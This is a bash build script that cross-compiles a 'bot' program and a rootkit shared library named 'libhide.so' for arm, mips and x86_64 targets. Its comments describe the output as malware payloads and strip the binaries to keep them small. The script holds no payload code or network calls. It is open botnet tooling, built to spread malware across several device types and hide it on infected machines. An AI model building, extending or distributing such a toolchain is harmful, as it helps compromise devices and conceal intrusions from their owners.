#!/bin/bash

# Stop script on any error
set -e

# This script simulates a cross-compilation environment for the bot and its rootkit.
# Configurable via environment variables.
ARCHS=${ARCHS:-"arm mips x86_64"}
SRCS=$(find src -name '*.c' -not -name 'rootkit.c')
ROOTKIT_SRC="src/stealth/rootkit.c"
OUTPUT_DIR="bin"

# Use -Os for size optimization, crucial for malware payloads. Remove -g.
CFLAGS="-Wall -Os -I./include -pthread"
ROOTKIT_CFLAGS="-fPIC -shared -Os"
STRIP=${STRIP:-strip}

clean() {
    echo "[*] Cleaning previous builds..."
    rm -rf "$OUTPUT_DIR"
}

build() {
    local arch=$1
    echo "[+] Building for architecture: $arch"
    mkdir -p "$OUTPUT_DIR/$arch"

    # In a real scenario, you would use a toolchain like:
    # TOOLCHAIN_PREFIX="${arch}-linux-gnu-"
    TOOLCHAIN_PREFIX=""
    CC="${TOOLCHAIN_PREFIX}gcc"

    # Compile the main bot executable
    echo "    -> Compiling bot..."
    "$CC" $CFLAGS $SRCS -o "$OUTPUT_DIR/$arch/bot"
    "$STRIP" "$OUTPUT_DIR/$arch/bot"

    # Compile the rootkit shared library
    echo "    -> Compiling rootkit..."
    "$CC" $ROOTKIT_CFLAGS "$ROOTKIT_SRC" -o "$OUTPUT_DIR/$arch/libhide.so"
    "$STRIP" "$OUTPUT_DIR/$arch/libhide.so"

    echo "    -> Success: $OUTPUT_DIR/$arch/bot and $OUTPUT_DIR/$arch/libhide.so"
}

clean
echo "[*] Starting multi-architecture build process for: $ARCHS"
for arch in $ARCHS; do
    build "$arch"
done

echo "[*] Build process finished."
